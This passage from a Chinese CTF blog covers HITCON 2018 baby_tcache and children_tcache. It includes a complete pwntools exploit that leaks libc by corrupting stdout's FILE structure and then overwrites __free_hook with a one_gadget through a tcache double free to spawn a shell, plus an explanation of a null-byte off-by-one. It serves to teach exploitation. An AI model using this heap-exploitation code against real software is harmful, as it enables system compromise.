<span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// our target</span></span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p></p><p>在这个函数中，正常的输出流程需要调用<code>_IO_do_write</code>，所以<code>f-&gt;_flags &amp; _IO_NO_WRITES</code>应该为0，<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING</code>不能为0。</p><p>然后<code>_IO_do_write</code>会以相同的参数调用<code>new_do_write</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 我们的目标</span></span><br><span class="line">  :</span><br><span class="line">  :</span><br></pre></td></tr></table></figure><p></p><p>我们的目标就是最后的<code>_IO_SYSWRITE(fp, data, to_do)</code>。从<code>_IO_do_write</code>的实参可知，<code>fp</code>就是FILE指针，<code>data</code>就是<code>f-&gt;_IO_write_base</code>，<code>to_do</code>则是<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base(数据长度)</code>。<br>因为<code>else if</code>中的条件构造起来十分困难，所以这里让程序流程通过<code>if</code>中的条件，即<code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code></p><p>综上，需要满足的条件有<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number，我也很绝望啊，没找到这个数据的解释</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure><p></p><p>即flags应该为<code>0xfbad1800</code><br>所以，如果可以控制stdout的FILE结构体，将<code>stdout-&gt;_flags</code>设置为我们计算出的值并将<code>stdout-&gt;_IO_write_base</code>的最低位字节改小一点，这样就能输出内存中的一段数据，而这段数据中通常就会存在libc中的某个地址。<br><img src="/post/8e1cd5dc/stdout.jpg" alt="stdout.jpg"></p><p>因为只要能够修改tcache中chunk的fd指针，就能在任意地址分配chunk。在前面的overlapping中，我们已经满足了这个条件，只需要改写<code>chunk_b2</code>的fd指针到<code>_IO_2_1_stdout_(stdout的FILE结构体)</code>，然后就可以在此处分配一个chunk并改写其中的值了。</p><p>因为<code>_IO_2_1_stdout_</code>的地址和在unsortedbin中chunk的fd指针的值只有最后3个16进制位不同，所以我们需要先在<code>chunk_b2</code>处通过overlapping申请并释放一个smallchunk来获取fd指针<br>然后再重新在这分配一个chunk，通过<code>partial overwrite</code>修改最低两个字节，因为有半个字节无法确定，所以先随意确定一个值，通过多次运行使内存中真实值与我们确定的值发生碰撞。</p><p>这里我将<code>stdout-&gt;_IO_write_base</code>最低位字节设置为<code>\x08</code>，因为刚好从该地址开始的8个字节为libc中的一个地址。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>) <span class="comment">#b2进入tcache || remain 0</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'b1'</span>) <span class="comment">#add 8</span></span><br><span class="line">del_7_times(<span class="number">1</span>, <span class="number">8</span>) <span class="comment">#remain 0 8</span></span><br><span class="line"><span class="comment">#此时topchunk与b2重叠</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x120</span>)</span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 9 || 在b2处创建一个smallchunk</span></span><br><span class="line">del_7_times(<span class="number">1</span>, <span class="number">8</span>) <span class="comment">#remain 0 8 9</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 1 || 防止topchunk合并</span></span><br><span class="line">dele(<span class="number">9</span>) <span class="comment">#remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc内部的fd指针</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'\x60\xa7'</span>) <span class="comment">#add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针，这个因为_IO_2_1_stdout_的最低3个16进制位为0x760，所以先随意确定该值为0xa760。</span></span><br><span class="line">add(<span class="number">0x210</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 3 || 从tcache中又将b2分配出来，此时_IO_2_1_stdout_的地址将位于tcache中</span></span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x08"</span></span><br><span class="line">add(<span class="number">0x210</span>, payload) <span class="comment">#add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc</span></span><br><span class="line">libc_base = u64(p.recvline()[:<span class="number">8</span>]) - <span class="number">0x3ED8B0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br></pre></td></tr></table></figure><p></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>在泄露出libc的地址后，接下来的事情就简单多了。因为在上面代码中，索引为2和3的chunk实际都为chunk_b2，所以可以通过tcache中的double free来再次修改fd值，实现在<code>__free_hook</code>处分配chunk，并写入one_gadget。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3和2都是chunk_b2，double free</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>, p64(free_hook)) <span class="comment">#修改fd为free_hook</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'xxxx'</span>) </span><br><span class="line">add(<span class="number">0x50</span>, p64(one_gadget)) <span class="comment">#将free_hook修改为onegadget</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p></p><p><img src="/post/8e1cd5dc/getshell.png" alt="getshell.png"></p><h2 id="我的EXP"><a href="#我的EXP" class="headerlink" title="我的EXP"></a>我的EXP</h2><blockquote><p>本地环境: Ubuntu 18.04.1 LTS</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_7_times</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(size, <span class="string">'xxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_7_times</span><span class="params">(begin, end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin, end):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    add_7_times(<span class="number">0x80</span>)</span><br><span class="line">    del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">    add_7_times(<span class="number">0x120</span>)</span><br><span class="line">    del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">    add_7_times(<span class="number">0x200</span>)</span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">'A'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x200</span>, <span class="string">'B'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x200</span>, <span class="string">'C'</span>) <span class="comment">#9</span></span><br><span class="line">    del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">8</span>) </span><br><span class="line">    dele(<span class="number">7</span>) <span class="comment">#remain 9</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">'A'</span>*<span class="number">0x108</span>) <span class="comment">#remain 0 9 || 创建了一个last_remainder</span></span><br><span class="line"></span><br><span class="line">    add_7_times(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'b1'</span>) <span class="comment">#remain 0 (1-7) 8 9</span></span><br><span class="line">    del_7_times(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">   </span><br><span class="line">    add(<span class="number">0x210</span>, <span class="string">'b2'</span>) <span class="comment">#add 1 || remain 0 1 8 9 || 将被overlap的chunk</span></span><br><span class="line">   </span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    dele(<span class="number">9</span>) <span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">1</span>) <span class="comment">#b2进入tcache || remain 0</span></span><br><span class="line">    </span><br><span class="line">    add_7_times(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'b1'</span>) <span class="comment">#add 8</span></span><br><span class="line">    del_7_times(<span class="number">1</span>, <span class="number">8</span>) <span class="comment">#remain 0 8</span></span><br><span class="line">    <span class="comment">#此时topchunk与b2重叠</span></span><br><span class="line"></span><br><span class="line">    add_7_times(<span class="number">0x120</span>)</span><br><span class="line">    add(<span class="number">0x120</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 9 || 在b2处创建一个smallchunk</span></span><br><span class="line">    del_7_times(<span class="number">1</span>, <span class="number">8</span>) <span class="comment">#remain 0 8 9</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 1 || 防止topchunk合并</span></span><br><span class="line">    dele(<span class="number">9</span>) <span class="comment">#remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc的fd指针</span></span><br><span class="line">   </span><br><span class="line">    add(<span class="number">0x50</span>, <span class="string">'\x60\xa7'</span>) <span class="comment">#add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针</span></span><br><span class="line">    add(<span class="number">0x210</span>, <span class="string">'xxxx'</span>) <span class="comment">#add 3 || 从tcache中又将b2分配出来，_IO_2_1_stdout_的地址位于tcache中</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x08"</span></span><br><span class="line">    add(<span class="number">0x210</span>, payload) <span class="comment">#add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#泄漏libc</span></span><br><span class="line">    libc_base = u64(p.recvline()[:<span class="number">8</span>]) - <span class="number">0x3ED8B0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#3和2都是b2,double free</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x50</span>, p64(free_hook)) <span class="comment">#修改fd为free_hook</span></span><br><span class="line">    add(<span class="number">0x50</span>, <span class="string">'xxxx'</span>) </span><br><span class="line">    add(<span class="number">0x50</span>, p64(one_gadget)) <span class="comment">#将free_hook修改为onegadget</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">          <span class="comment">#  gdb.attach(p)</span></span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>二进制文件：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/challenges/Hitcon2018/baby_tcache/baby_tcache" target="_blank" rel="noopener">baby_tcache</a><br>writeup参考：<br><a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a><br><a href="https://znqt.github.io/hitcon2018-babytcache/" target="_blank" rel="noopener">https://znqt.github.io/hitcon2018-babytcache/</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> off_by_one </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> overlapping </tag>
            
            <tag> tcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon2018 children_tcache writeup &amp;&amp; overlapping</title>
      <link href="/post/cdad9cf7.html"/>
      <url>/post/cdad9cf7.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。</p></blockquote><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2018<br>知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one<br><a id="more"></a><br>题目界面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊    Children Tcache    🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   <span class="number">1.</span> New heap           $</span><br><span class="line">$   <span class="number">2.</span> Show heap          $</span><br><span class="line">$   <span class="number">3.</span> Delete heap        $ </span><br><span class="line">$   <span class="number">4.</span> Exit               $ </span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p>保护全开：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p></p><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p><strong>new_heap</strong>函数中:<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  get_str((__int64)&amp;s, size);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);</span><br><span class="line">  data_list[i] = dest;</span><br><span class="line">  size_list[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>因为strcpy函数在拷贝字符串时，最后的’\0’也会一起拷贝，所以当输入的字符串已经占满了所分配的内存，那最后的’\0’会往后溢出一个字节，导致了<strong>null byte off_by_one</strong>。</p><blockquote><p>看到<strong>null byte off_by_one</strong>，我首先就想到构造chunk overlapping，然而太菜。不够熟悉tcache以及overlap，所以到最后也没做出来</p></blockquote><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>这题目其实不难，前面一部分都是标准的overlaping的流程，只是因为多了tcache，所以要不停的填充和清空tcache，来保证我们的chunk不受它的影响。真正利用tcache的地方只有最后的double free(tcache dup)。<br>为了省时间就不单独分析了，直接写在exp里，赶作业要紧。。。。。</p><h2 id="补充-overlapping-2018-11-03"><a href="#补充-overlapping-2018-11-03" class="headerlink" title="补充 overlapping(2018-11-03)"></a>补充 overlapping(2018-11-03)</h2><blockquote><p>今天在发现这题还有一个要点我没注意到！！！！overlapping新姿势！！！(对我来说足够新2333)，所以回来补充一下</p></blockquote><h3 id="overlapping常规"><a href="#overlapping常规" class="headerlink" title="overlapping常规"></a>overlapping常规</h3><blockquote><p>先回顾一下常规overlapping</p></blockquote><p><img src="/post/cdad9cf7/overlap.png" alt="overlapping"><br>可以看到，如果要通过null byte off_by_one构造overlapping，首先需要伪造chunk_C的<code>prevsize</code>(如上图第二步)，否则在分配b1的时候会<code>corrupted size vs. prev_size</code>。</p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>查看malloc源码可以发现，<code>corrupted</code>的原因在于从unsortedbin中取出chunk时会调用unlink，正是unlink中的检查导致了错误。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取对应victim的大小</span></span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">    <span class="comment">// 计算分割后剩余的大小</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>而该题目在free时，会将整个chunk全部填充为<code>0xda</code>，所以没有办法伪造<code>prevsize</code>。所以该题利用过程中使用了采用了一种不需要伪造prevsize的技巧。</p><p>在执行malloc时，若fastbin和smallbin中没有合适的chunk，并且请求为<code>small chunk</code>的话，将会首先考虑使用<code>last_remainder</code>。如果last_remainder是unsorted bin中的唯一一块，并且last_remainder的大小分割够还可以作为一个 chunk，那么就会从<code>last_remainder</code>中分割下合适大小的块。</p><p>而从<code>last_remainder</code>分割chunk的话就不会使用到unlink，从而成功分配<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">  only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">  runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">  exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">  no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">  bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">  victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">  av-&gt;last_remainder = remainder;</span><br><span class="line">  remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    